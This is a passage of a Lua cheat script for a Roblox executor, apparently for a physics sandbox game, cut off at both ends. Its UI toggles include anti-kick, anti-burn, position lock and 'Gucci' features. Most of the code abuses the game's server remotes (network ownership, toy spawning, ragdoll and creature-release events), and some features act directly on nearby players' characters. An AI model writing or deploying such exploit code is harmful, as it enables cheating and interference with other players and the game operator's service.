											CFrame.new(0, 5000, 0), 
											Vector3.zero
										)
									end)
								end)
							end
						end
					end
					task.wait(getgenv().AntiInputCycleSpeed or 0.02)
				end
			end)
		else
			if inv:FindFirstChild("antiinputfood") then
				functions.DestroyToy:FireServer(inv.antiinputfood)
			end
		end
	end
})

ClassicDefense:AddToggle("AntiPaint", {
    Text = "Anti Paint",
    Default = false,
    Callback = function(v)
        if v then
            getgenv().AntiPaintConn = Workspace.DescendantAdded:Connect(function(d)
                if d.Name == "PaintPlayerPart" then
                    task.wait(0.1)
                    d:Destroy()
                end
            end)
            for _, d in pairs(Workspace:GetDescendants()) do
                if d.Name == "PaintPlayerPart" then d:Destroy() end
            end
        else
            if getgenv().AntiPaintConn then getgenv().AntiPaintConn:Disconnect() end
        end
    end
})

-- =====================================================================
-- [KOZMOZ PORT] Pos Lock (musa(4) 8956-9010) - Anti Paint'in altina
-- =====================================================================
do
    local ocnGroovConn = nil
    local ocnGroovPos = nil
    ClassicDefense:AddToggle("KozPosLock", {
        Text = "Pos Lock",
        Default = false,
        Callback = function(Value)
            KozFlags.PosLock = Value
            if Value then
                pcall(function()
                    local c = KozPLR.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root then
                        ocnGroovPos = root.CFrame
                    end
                    ocnGroovConn = KozRun.RenderStepped:Connect(function()
                        local c2 = KozPLR.Character
                        local root2 = c2 and c2:FindFirstChild("HumanoidRootPart")
                        if root2 and ocnGroovPos then
                            local assembly = root2.AssemblyRootPart or root2
                            assembly.AssemblyLinearVelocity = Vector3.zero
                            assembly.AssemblyAngularVelocity = Vector3.zero
                            local offset = assembly.CFrame:ToObjectSpace(root2.CFrame)
                            assembly.CFrame = ocnGroovPos * offset:Inverse()
                        end
                    end)
                end)
            else
                if ocnGroovConn then
                    ocnGroovConn:Disconnect()
                    ocnGroovConn = nil
                end
                pcall(function()
                    local c2 = KozPLR.Character
                    local root2 = c2 and c2:FindFirstChild("HumanoidRootPart")
                    if root2 then
                        local assembly = root2.AssemblyRootPart or root2
                        assembly.AssemblyLinearVelocity = Vector3.zero
                        assembly.AssemblyAngularVelocity = Vector3.zero
                        if ocnGroovPos then
                            root2.CFrame = ocnGroovPos
                            ocnGroovPos = nil
                        end
                    end
                end)
            end
        end
    })
end

ClassicDefense:AddDivider()

ClassicDefense:AddLabel("Kill & Kick", true, Color3.fromRGB(255, 100, 100))

ClassicDefense:AddToggle("AntiKill", {
    Text = "Anti Loop Kill",
    Default = false,
    Callback = function(v)
        if v then
            getgenv().AntiKillConn = plr.CharacterAdded:Connect(function(char)
                hrp = char:WaitForChild("HumanoidRootPart")
                hrp.CFrame = CFrame.new(524.7039794921875, 93.71200561523438, -375.0409851074219)
            end)
        else
            if getgenv().AntiKillConn then getgenv().AntiKillConn:Disconnect() end
        end
    end
})

Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
Workspace = game:GetService("Workspace")

plr = Players.LocalPlayer

function StartPolarAntiKick()
    inv = Workspace:FindFirstChild(plr.Name.."SpawnedInToys")
    local hrp
    setOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
    stickyEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
    destroyrem = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
    canSpawn = plr:WaitForChild("CanSpawnToy")
    local function getHRP()
        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            return plr.Character.HumanoidRootPart
        else
            character = plr.CharacterAdded:Wait()
            return character:WaitForChild("HumanoidRootPart")
        end
    end
    local function CheckForHome()
        local ToyFolder
        if not Workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then 
            return false
        end
        for _, v in pairs(Workspace.Plots:GetChildren()) do
            for _, b in pairs(v.PlotSign.ThisPlotsOwners:GetChildren()) do
                if b.Value == plr.Name then
                    ToyFolder = Workspace.PlotItems[v.Name]
                end
            end
        end
        if ToyFolder then 
            return true, ToyFolder
        else 
            return false
        end
    end
    local function StickKunai(kunai)
        if not kunai or not kunai:FindFirstChild("StickyPart") then return end
        currentHRP = getHRP()
        if kunai:FindFirstChild("SoundPart") then
            if not kunai["SoundPart"]:FindFirstChild("PartOwner") or kunai["SoundPart"].PartOwner.Value ~= plr.Name then 
                setOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
            end
        end
        stickyEvent:FireServer(
            kunai.StickyPart,
            currentHRP:FindFirstChild("FirePlayerPart") or currentHRP:WaitForChild("FirePlayerPart"),
            CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(90),math.rad(90))
        )
        for _, obj in pairs(kunai:GetChildren()) do
            if obj.Name == "Pyramid" then
                obj.CanTouch = false
                obj.CanCollide = false
                obj.CanQuery = false
                obj.Transparency = 0
                high = Instance.new("Highlight")
                high.FillColor = Color3.fromRGB(0, 0, 0)
                high.Parent = obj
            elseif obj.Name == "Main" then
                obj.CanTouch = false
                obj.CanCollide = false
                obj.CanQuery = false
                obj.Transparency = 0
                high = Instance.new("Highlight")
                high.FillColor = Color3.fromRGB(255, 255, 255)
                high.Parent = obj
            elseif obj:IsA("BasePart") then
                obj.CanTouch = false
                obj.CanCollide = false
                obj.CanQuery = false
                obj.Transparency = 1
            end
        end
    end
    local function ClearKunai()
        currentInv = Workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        if currentInv and destroyrem then
            for _,v in pairs(currentInv:GetChildren()) do
                if v.Name == "AntiKick" then
                    pcall(function() destroyrem:FireServer(v) end)
                end
            end
        end
    end
    local function SpawnToy(name)
        while not canSpawn.Value do
            canSpawn.Changed:Wait()
        end
        currentHRP = getHRP()
        task.spawn(function()
            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                name,
                currentHRP.CFrame * CFrame.new(0, 12, 20),
                Vector3.new(0,0,0)
            )
        end)
        boolik, house = CheckForHome()
        currentInv = Workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        if boolik then 
            return house:WaitForChild(name, 2)
        elseif not Workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then 
            return currentInv and currentInv:WaitForChild(name, 2)
        elseif Workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) and not boolik then 
            return nil
        end
    end
    while _G.ShurikenAntiKick do 
        task.wait(0.005)
        if not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health <= 0 then 
            continue 
        end
        currentInv = Workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        if not currentInv then continue end
        kunai = currentInv:FindFirstChild("NinjaShuriken")
        if Workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then 
            boolik, house = CheckForHome()
            if boolik and house and Workspace.Plots:FindFirstChild(house.Name) and Workspace.Plots:FindFirstChild(house.Name)["PlotSign"]["ThisPlotsOwners"]:FindFirstChild("Value") and Workspace.Plots:FindFirstChild(house.Name)["PlotSign"]["ThisPlotsOwners"]["Value"]["TimeRemainingNum"].Value > 89 then 
                kunai = SpawnToy("NinjaShuriken")
                if kunai == nil then continue end
                kunai.Name = "AntiKick" 
                StickKunai(kunai)
            end
        end
        if not kunai then
            if Workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then continue end 
            kunai = SpawnToy("NinjaShuriken")
            if kunai == nil then continue end 
            kunai.Name = "AntiKick"
            if not kunai then continue end 
        end
        repeat
            if kunai and kunai:FindFirstChild("StickyPart") and kunai.StickyPart.CanTouch == true then
                StickKunai(kunai)
                kunai.Name = "AntiKick"
            end
            wait(0.3)
        until not kunai or not _G.ShurikenAntiKick 
            or not kunai:FindFirstChild("StickyPart")
            or kunai.StickyPart.CanTouch == false 
            or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") 
            or not kunai:FindFirstChild("StickyPart") 
            or (plr.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20
        if not kunai or not kunai:FindFirstChild("StickyPart") or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or (plr.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then 
            ClearKunai()
        end 
        pcall(function()
            repeat
                wait(0.05)
            until not _G.ShurikenAntiKick or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or not kunai or not kunai:FindFirstChild("StickyPart") or not kunai.StickyPart:FindFirstChild("StickyWeld") or not kunai.StickyPart.StickyWeld.Part1
            if not kunai or not kunai:FindFirstChild("StickyPart") or (plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health <= 0) or not kunai["StickyPart"]:FindFirstChild("StickyWeld").Part1 then 
                ClearKunai()
            end
        end)
    end
end

ClassicDefense:AddToggle("AntiKick", {
    Text = "Anti Kick [Shuriken]",
    Default = false,
    Callback = function(v)
        _G.ShurikenAntiKick = v
        if v then
            task.spawn(StartPolarAntiKick)
        else
            currentInv = Workspace:FindFirstChild(plr.Name.."SpawnedInToys")
            destroyrem = ReplicatedStorage:FindFirstChild("MenuToys") and ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
            if currentInv and destroyrem then
                for _, item in pairs(currentInv:GetChildren()) do
                    if item.Name == "AntiKick" or item.Name == "NinjaShuriken" then
                        pcall(function() destroyrem:FireServer(item) end)
                    end
                end
            end
        end
    end
})

do
    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local plr = Players.LocalPlayer
    local AntiKickItemActive = false
    local MyPCLD = nil
    local pcldConn = nil
    local AntiKickToyList2 = {
        ["Japanese Lantern"] = "JapaneseLantern",
        ["Spray Can"]        = "SprayCanWD",
        ["Spooky Candle"]    = "SpookyCandle1",
        ["Clock"]            = "ClockAlarm"
    }
    local DropdownValues = {}
    for shortName, _ in pairs(AntiKickToyList2) do
        table.insert(DropdownValues, shortName)
    end
    table.sort(DropdownValues)
    local SelectedToy = AntiKickToyList2["Clock"] or AntiKickToyList2[DropdownValues[1]]
    ClassicDefense:AddDropdown("AntiKickItemSelect", {
        Values = DropdownValues,
        Default = 4,
        Multi = false,
        Text = "Anti Kick Item",
        Callback = function(Value)
            SelectedToy = AntiKickToyList2[Value]
        end
    })
    local function GetMagnitude(Part1, Part2)
        return (Part1.Position - Part2.Position).Magnitude
    end
    local function FWD(parent, part, timeOffset)
        return parent:FindFirstChild(part) or parent:WaitForChild(part, timeOffset or 1)
    end
    local function CFP(parent, part)
        return parent:FindFirstChild(part) ~= nil  
    end
    local function CheckNetworkOwnerOnPart(Part) 
        local po = Part:FindFirstChild("PartOwner")
        return po and po.Value == plr.Name
    end
    local function sno(part)
        pcall(function()
            local grabEvents = RS:FindFirstChild("GrabEvents")
            local setNetOwner = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
            if setNetOwner then
                setNetOwner:FireServer(part, part.CFrame)
            end
        end)
    end
    local function CheckForHome()
        local plotItems = workspace:FindFirstChild("PlotItems")
        local plots = workspace:FindFirstChild("Plots")
        if plots and plotItems then
            for i = 1, 5 do 
                local Plot = plots:FindFirstChild("Plot"..i)
                if Plot then
                    local sign = Plot:FindFirstChild("PlotSign")
                    local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                    if owners then
                        for _,v in pairs(owners:GetChildren()) do 
                            if v.Value == plr.Name then 
                                return plotItems:FindFirstChild("Plot"..i)
                            end
                        end
                    end
                end
            end
        end
        return nil
    end
    local function SpawnToy(ToyName)
        local InPlot = plr:FindFirstChild("InPlot")
        local InOwnedPlot = plr:FindFirstChild("InOwnedPlot")
        local CanSpawnToy = plr:FindFirstChild("CanSpawnToy")
        local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then 
            InPlot:GetPropertyChangedSignal("Value"):Wait()
        end 
        if CanSpawnToy and not CanSpawnToy.Value then 
            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
        end
        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end
        local SpawnCF = (MyPCLD or hrp).CFrame * CFrame.new(0, 14, 20)
        local Container = (InOwnedPlot and InOwnedPlot.Value) and CheckForHome() or inv
        if not Container then return nil end
        local spawnedObject = nil
        local connection
        connection = Container.ChildAdded:Connect(function(child)
            if child.Name == ToyName then
                spawnedObject = child
            end
        end)
        task.spawn(function()
            pcall(function()
                local menuToys = RS:FindFirstChild("MenuToys")
                local spawnRemote = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction")
                if spawnRemote then
                    spawnRemote:InvokeServer(ToyName, SpawnCF, Vector3.zero)
                end
            end)
        end)
        local start = tick()
        repeat task.wait() until spawnedObject or (tick() - start) > 2.5
        if connection then connection:Disconnect() end
        return spawnedObject
    end
    local function FindPCLD(hrp)
        if pcldConn then pcldConn:Disconnect() end
        MyPCLD = nil
        pcldConn = RunService.Heartbeat:Connect(function()
            if MyPCLD or not hrp or not hrp.Parent then 
                if pcldConn then pcldConn:Disconnect() pcldConn = nil end
                return
            end
            for _, v in pairs(workspace:GetChildren()) do 
                if v.Name == "PlayerCharacterLocationDetector" and v:IsA("BasePart") then
                    if GetMagnitude(v, hrp) <= 2 then 
                        MyPCLD = v
                        break
                    end
                end
            end
        end)
    end
    ClassicDefense:AddToggle("AntiKickItem", {
        Text = "Anti Kick [ITEM]",
        Default = false,
        Callback = function(Val)
            AntiKickItemActive = Val 
            if Val then
                task.spawn(function()
                    local Item, SoundPart
                    while AntiKickItemActive and task.wait() do 
                        local char = plr.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        local hum = char and char:FindFirstChild("Humanoid")
                        local inPlot = plr:FindFirstChild("InPlot")
                        local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                        local destroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
                        if not hrp or not hum or hum.Health <= 0 or not inv then continue end  
                        if inPlot and inPlot.Value then continue end 
                        if not MyPCLD and not pcldConn then
                            FindPCLD(hrp)
                        end
                        Item = inv:FindFirstChild("AntiKickItem") 
                        SoundPart = Item and Item:FindFirstChild("Hitbox")
                        if not Item or not SoundPart then
                            for _,v in pairs(inv:GetChildren()) do 
                                if v.Name == "AntiKickItem" then 
                                    pcall(function() destroyToy:FireServer(v) end)
                                end
                            end
                            Item = SpawnToy(SelectedToy)
                            if not Item then continue end 
                            SoundPart = Item and FWD(Item, "Hitbox", 0.5)
                            if SoundPart then sno(SoundPart) end
                            for _,v in pairs(Item:GetChildren()) do 
                                if v:IsA("BasePart") then 
                                    v.CanCollide = false 
                                    v.Transparency = 0.9
                                    v.Color = Color3.fromRGB(255, 255, 255)
                                end
                            end
                            Item.Name = "AntiKickItem"
                        end
                        if Item and Item.Parent then
                            for _,v in pairs(inv:GetChildren()) do
                                if v.Name == "AntiKickItem" and v ~= Item then
                                    pcall(function() destroyToy:FireServer(v) end)
                                end
                            end
                        end
                        if SoundPart and not CheckNetworkOwnerOnPart(SoundPart) then 
                            sno(SoundPart)
                        end
                        local targetPart = MyPCLD or hrp:FindFirstChild("FirePlayerPart") or hrp
                        if SoundPart and targetPart then
                            SoundPart.CFrame = targetPart.CFrame
                            SoundPart.AssemblyLinearVelocity = Vector3.zero
                            SoundPart.AssemblyAngularVelocity = Vector3.zero
                        end
                    end
                end)
            else
                if pcldConn then pcldConn:Disconnect() pcldConn = nil end
                MyPCLD = nil
                task.spawn(function()
                    local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                    local destroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
                    if inv and destroyToy then
                        for _,v in pairs(inv:GetChildren()) do 
                            if v.Name == "AntiKickItem" then 
                                pcall(function() destroyToy:FireServer(v) end)
                            end
                        end
                    end
                end)
            end
        end
    })
    plr.CharacterAdded:Connect(function(char)
        if AntiKickItemActive then
            MyPCLD = nil
            local hrp = char:WaitForChild("HumanoidRootPart", 5)
            if hrp then FindPCLD(hrp) end
        end
    end)
end

ClassicDefense:AddDivider()

ClassicDefense:AddLabel("Burn & Blobman", true, Color3.fromRGB(255, 150, 50))

ClassicDefense:AddToggle("AntiBurn", {
    Text = "Anti Burn",
    Default = false,
    Callback = function(v)
        if v then
            getgenv().AntiBurnCharConn = plr.CharacterAdded:Connect(function(ch)
                if getgenv().AntiBurnConn then getgenv().AntiBurnConn:Disconnect() end
                local hum = ch:WaitForChild("Humanoid", 0.5)
                if not hum then return end
                local fireDebounce = hum:FindFirstChild("FireDebounce")
                if not fireDebounce then return end
                getgenv().AntiBurnConn = fireDebounce.Changed:Connect(function()
                    if fireDebounce.Value == true then
                        local bar = Workspace.Plots.Plot1.Barrier.PlotBarrier
                        local pos = bar.CFrame
                        task.spawn(function()
                            repeat task.wait() bar.CFrame = ch.HumanoidRootPart.CFrame until not fireDebounce.Value
                        end)
                        task.wait(1)
                        fireDebounce.Value = false
                        task.wait()
                        bar.CFrame = pos
                    end
                end)
            end)
            local currentHum = plr.Character and plr.Character:FindFirstChild("Humanoid")
            if currentHum then
                local fireDebounce = currentHum:FindFirstChild("FireDebounce")
                if fireDebounce then
                    getgenv().AntiBurnConn = fireDebounce.Changed:Connect(function()
                        if fireDebounce.Value == true then
                            local bar = Workspace.Plots.Plot1.Barrier.PlotBarrier
                            local pos = bar.CFrame
                            task.spawn(function()
                                repeat task.wait() bar.CFrame = plr.Character.HumanoidRootPart.CFrame until not fireDebounce.Value
                            end)
                            task.wait(1)
                            fireDebounce.Value = false
                            task.wait()
                            bar.CFrame = pos
                        end
                    end)
                end
            end
        else
            if getgenv().AntiBurnConn then getgenv().AntiBurnConn:Disconnect() end
            if getgenv().AntiBurnCharConn then getgenv().AntiBurnCharConn:Disconnect() end
        end
    end
})

-- =====================================================================
-- [KOZMOZ DUZELTME] Anti Blobman Aura (PNG 10) - mantigi bozulmustu:
--   * her acisda yeni bir dongu task.spawn ediliyordu (tek thread koruması
--     yoktu) ve `else` dali bos oldugu icin kapatince dongu durmuyordu,
--   * sadece SetNetworkOwner atiliyordu; blob bindirmesini bozan bir
--     islem yapmiyordu.
-- Simdi: tek dongu garantisi, KozFlags.AntiBlobmanAura ile temiz kapanis
-- ve ownership alimina ek olarak CreatureRelease/CreatureDrop ile hedefi
-- blob'dan asagi indirir (musa(4) 3449-3480'deki release mantigi).
-- =====================================================================
KozAuraThread = nil

function StartAntiBlobmanAura()
    if KozAuraThread then
        return
    end
    KozAuraThread = task.spawn(function()
        local plr = KozPLR
        while KozFlags.AntiBlobmanAura do
            if not KozState.isRespawning then
                local myChar = plr.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                local acted = false
                if myRoot and myHum and myHum.Health > 0 then
                    for _, player in ipairs(KozPlayers:GetPlayers()) do
                        if player ~= plr and player.Character then
                            local playerRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                            local playerHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                            local seat = playerHumanoid and playerHumanoid.SeatPart
                            local blob = seat and seat.Parent
                            if playerRootPart
                                and blob
                                and blob.Name == "CreatureBlobman"
                                and (playerRootPart.Position - myRoot.Position).Magnitude <= 19 then
                                acted = true
                                pcall(function()
                                    local setOwner = KozRemote.SetNetworkOwner
                                    if setOwner then
                                        setOwner:FireServer(playerRootPart, playerRootPart.CFrame)
                                    end
                                end)
                                pcall(function()
                                    local scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
                                    local release = scr and scr:FindFirstChild("CreatureRelease")
                                    local drop = scr and scr:FindFirstChild("CreatureDrop")
                                    local ld = blob:FindFirstChild("LeftDetector")
                                    local rd = blob:FindFirstChild("RightDetector")
                                    if release and ld and ld:FindFirstChild("LeftWeld") then
                                        release:FireServer(ld.LeftWeld)
                                    end
                                    if release and rd and rd:FindFirstChild("RightWeld") then
                                        release:FireServer(rd.RightWeld)
                                    end
                                    if drop then
                                        drop:FireServer(playerRootPart)
                                    end
                                end)
                                task.wait(0.01)
                            end
                        end
                    end
                end
                task.wait(acted and 0.05 or 0.1)
            else
                task.wait(0.1)
            end
        end
        KozAuraThread = nil
    end)
end

function StopAntiBlobmanAura()
    KozFlags.AntiBlobmanAura = false
end

ClassicDefense:AddToggle("AntiBlobmanAura", {
    Text = "Anti Blobman Aura",
    Default = false,
    Callback = function(v)
        KozFlags.AntiBlobmanAura = v
        _G.AntiBlobmanAura = v
        if v then
            StartAntiBlobmanAura()
        else
            StopAntiBlobmanAura()
            if KozAuraThread then
                pcall(task.cancel, KozAuraThread)
                KozAuraThread = nil
            end
        end
    end
})

-- =====================================================================
-- [KOZMOZ PORT] PNG 15'teki "Anti Blobman" + "Anti Ragdoll on Blob"
-- kaldirildi; yerine endorist (endrst.txt 3152-3202 + 1078-1107)
-- "Anti Ragdoll on Blob" + "Anti Blobman Kill" geldi.
-- =====================================================================
ClassicDefense:AddToggle("AntiRagBlob", {
    Text = "Anti Ragdoll on Blob",
    Default = false,
    Callback = function(v)
        KozFlags.AntiRagBlob = v
        if v then
            local RagdollRemote = KozRS:FindFirstChild("RagdollRemote") or KozRemote.RagdollRemote
            local RagdolledSit = false
            local function DiscAR(key)
                if KozState.antiRagBlobConns[key] then KozState.antiRagBlobConns[key]:Disconnect() KozState.antiRagBlobConns[key] = nil end
            end
            local function setupCharacter(char)
                local hum = char and char:FindFirstChild("Humanoid")
                local HRP = char and char:FindFirstChild("HumanoidRootPart")
                if hum and HRP and RagdollRemote then
                    DiscAR("ARSeat")
                    KozState.antiRagBlobConns["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                        if hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" and not RagdolledSit then
                            RagdolledSit = true
                            local Seat = hum.SeatPart
                            while not hum.Sit do task.wait() end
                            RagdollRemote:FireServer(HRP, 3)
                            while not (hum:FindFirstChild("Ragdolled") and hum.Ragdolled.Value) and not hum.Sit do task.wait() end
                            task.wait(0.4)
                            hum.Sit = false
                            if Seat and Seat:IsA("Part") then Seat:Sit(hum) end
                            task.delay(0.25, function()
                                while hum and hum.SeatPart do
                                    if KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart") then
                                        RagdollRemote:FireServer(KozPLR.Character.HumanoidRootPart, 1)
                                    end
                                    task.wait(0.05)
                                end
                                RagdolledSit = false
                            end)
                        end
                    end)
                end
            end
            setupCharacter(KozPLR.Character or KozPLR.CharacterAdded:Wait())
            DiscAR("ARChar")
            KozState.antiRagBlobConns["ARChar"] = KozPLR.CharacterAdded:Connect(function(newChar)
                task.wait(0.5)
                setupCharacter(newChar)
            end)
        else
            for _, conn in pairs(KozState.antiRagBlobConns) do if conn then conn:Disconnect() end end
            KozState.antiRagBlobConns = {}
        end
    end
})

ClassicDefense:AddToggle("AntiBlobmanKill", {
    Text = "Anti Blobman Kill",
    Default = false,
    Callback = function(v)
        KozFlags.AntiBlobmanKill = v
        if v then KozFeature.startAntiBlobmanKill() else KozFeature.stopAntiBlobmanKill() end
    end
})

ClassicDefense:AddDivider()

ClassicDefense:AddLabel("Environment", true, Color3.fromRGB(100, 200, 100))

ClassicDefense:AddToggle("AntiExplode", {
    Text = "Anti Explode",
    Default = false,
    Callback = function(v)
        if v then
            getgenv().AntiExplodeConn = Workspace.ChildAdded:Connect(function(c)
                if c.Name == "Part" then
                    char = plr.Character
                    if (c.Position - char.HumanoidRootPart.Position).Magnitude < 40 and char.Humanoid.Ragdolled.Value == true then
                        char.HumanoidRootPart.Anchored = true
                        task.wait(0.01)
                        char.HumanoidRootPart.Anchored = false
                        stvel(char.HumanoidRootPart)
                        char.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
                    end
                end
            end)
        else
            if getgenv().AntiExplodeConn then getgenv().AntiExplodeConn:Disconnect() end
        end
    end
})

ClassicDefense:AddToggle("AntiVoid", {
    Text = "Anti Void",
    Default = false,
    Callback = function(v)
        if v then
            Workspace.FallenPartsDestroyHeight = 0/0
        else
            Workspace.FallenPartsDestroyHeight = -100
        end
    end
})

local function getPing()
    local ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()
    return ping
end

GucciDefense = Tabs.DefenseTab:AddRightGroupbox("Gucci Methods")

-- =====================================================================
-- [KOZMOZ PORT] Gucci (PNG 3 -> PNG 4)
-- Gucci Methods kutusundaki "Gucci (Tractor)", "Gucci (Train)" ve
-- "Auto Gucci (blobman)" toggle'lari kaldirildi; yerine musa(4)
-- 8944-8955'teki 6 modlu "Gucci" dropdown'i + "Apply Gucci" toggle'i
-- geldi. Motor tamamen musa(4)'ten tasinandir:
--   * 7554-7856  : Blobman / Blobman Breaked / Santa Sleigh (blob makinesi)
--   * 8567-8943  : gucciTractor/Train/Santa start-stop + gucciApply
-- =====================================================================
;(function()
local GUE = false
local itm = nil
local sp = nil
local sv = nil
local humconnection = nil
local hum, hrp = nil, nil
local gucciRunning = false
local inexistance = {}
gucciTypes = {
    ['Blobman'] = 'CreatureBlobman',
    ['Blobman Breaked'] = 'CreatureBlobman',
    ['Tractor'] = 'TractorGreen',
    ['Santa Sleigh'] = 'SantaSleigh'
}
local selectedGucciType = 'CreatureBlobman'
local function getCharParts()
    local char = KozPLR.Character
    if not char then
        return nil, nil
    end
    return char:FindFirstChild('Humanoid'), char:FindFirstChild('HumanoidRootPart')
end
hum, hrp = getCharParts()
local characterAddedConnection
gucciRunning = false
local function diddle()
    if itm then
        for _, prt in pairs(itm:GetChildren())do
            if prt:IsA('BasePart') then
                prt.CanCollide = false
            end
        end
    end
    hrp.CFrame = sp
    hrp.AssemblyLinearVelocity = sv
    hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
end
local function checkgrab(part)
    pcall(function()
        KozRemote.SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end
local function preserveGucciBlobman(item)
    if gucciMode == "Blobman Breaked" then
        return false
    end
    return item and (item.Name == "CreatureBlobman" or item.Name == "SantaSleigh")
end
local function removeGucciItem(item, force)
    if not item or not item.Parent or (preserveGucciBlobman(item) and not force) then return false end
    task.spawn(function()
        if item and item.Parent and KozRemote.DestroyToy then
            pcall(function()
                KozRemote.DestroyToy:FireServer(item)
            end)
        end
    end)
    return true
end
local function gucciblob()
    if gucciRunning then
        return
    end
    gucciRunning = true
    local guccion = false
    local tickyticky = tick()
    local lastSpawnAttempt = 0
    local function getGucciSpawnCFrame()
        if selectedGucciType == "CreatureBlobman" then
            return hrp.CFrame * CFrame.new(0, 100000000, 10)
        end
        return hrp.CFrame * CFrame.new(0, -1, 13)
    end
    local function canSpawnToyNow()
        local canSpawnVal = KozPLR:FindFirstChild("CanSpawnToy")
        if not canSpawnVal then return true end
        return canSpawnVal.Value == true
    end
    local function triggerGucciSpawn()
        if tick() - lastSpawnAttempt < 0.4 then return end
        if not canSpawnToyNow() then return end
        lastSpawnAttempt = tick()
        task.spawn(function()
            pcall(function()
                KozRemote.SpawnToyRemoteFunction:InvokeServer(selectedGucciType, getGucciSpawnCFrame(), Vector3.new(0, 0, 0))
            end)
        end)
    end
    while GUE do
        hum, hrp = getCharParts()
        if hum and hrp then
            local dt = tick() - tickyticky
            tickyticky = tick()
            if itm and itm:FindFirstChild('VehicleSeat') then
                local seat = itm.VehicleSeat
                local occupant = seat.Occupant
                if occupant and occupant ~= hum then
                    if not preserveGucciBlobman(itm) then
                        removeGucciItem(itm)
                        itm = nil
                        guccion = false
                        inexistance = {}
                        task.wait(0.05)
                        triggerGucciSpawn()
                    else
                        guccion = false
                        -- Instant detection and reclamation: wait on Occupant property change
                        local occSignal = seat:GetPropertyChangedSignal("Occupant")
                        while seat and seat.Parent and seat.Occupant and seat.Occupant ~= hum and GUE do
                            occSignal:Wait()
                        end
                        -- Instant teleport onto seat and reclaim seat immediately when broken occupant leaves
                        if GUE and hum and hrp and seat and seat.Parent and (not seat.Occupant or seat.Occupant == hum) then
                            for _, prt in pairs(itm:GetChildren()) do
                                if prt:IsA("BasePart") then
                                    pcall(function() KozRemote.SetNetworkOwner:FireServer(prt, CFrame.lookAt(hrp.CFrame.Position, prt.CFrame.Position)) end)
                                end
                            end
                            hrp.CFrame = seat.CFrame + Vector3.new(0, 1.5, 0)
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            seat:Sit(hum)
                            pcall(function() KozRemote.RagdollRemote:FireServer(hrp, 0.016) end)
                            guccion = true
                        end
                    end
                    task.wait()
                    continue
                end
            end
            if itm and itm.Parent and not ((itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant ~= hum) or (inexistance[itm] or 0) < 1) then
                if not preserveGucciBlobman(itm) then
                    removeGucciItem(itm)
                    itm = nil
                end
            else
                local toyFolder = KozWS:FindFirstChild(KozPLR.Name .. 'SpawnedInToys')
                itm = toyFolder and toyFolder:FindFirstChild(selectedGucciType)
            end
            if not sp or not hum.SeatPart then
                sp = hrp.CFrame
                sv = hrp.AssemblyLinearVelocity
            end
            if humconnection ~= hum then
                humconnection = hum
                hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
            end
            local wait = true
            if itm then
                inexistance[itm] = (inexistance[itm] or 0) + dt
                if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                    if not guccion then
                        (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 0, 0)
